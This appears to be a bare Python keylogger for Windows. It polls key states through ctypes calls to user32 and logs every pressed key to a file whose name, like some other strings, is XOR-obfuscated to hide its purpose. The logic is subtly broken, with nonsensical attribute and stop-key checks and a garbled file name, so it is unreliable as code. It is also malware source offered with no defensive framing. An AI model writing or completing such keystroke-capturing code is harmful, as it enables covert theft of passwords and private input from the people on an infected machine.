```python
import ctypes
import os

user32 = ctypes.WinDLL('user32', use_last_error=True)
file_name = ''.join(chr(ord(c) ^ 5) for c in '\x16\x0f\x1a\x17\x1e\x0b\x18\x03')
def on_press(key):
    try:
        with open(file_name, 'a') as f:
            if hasattr(key, chr(ord('c') ^ 5)): 
                f.write(key.char)
            else:
                f.write('[{}]'.format(key))
    except IOError as e:
        print("I/O error occurred:", str(e))
def on_release(key):
    if key == user32.VkKeyScanExA(chr(ord('E') ^ 5), 0):
        return False
while True:
    for i in range(1, 256):
        state = user32.GetAsyncKeyState(i)
        if state & 0x8000:
            on_press(chr(i))
            if not on_release(chr(i)):
                break
```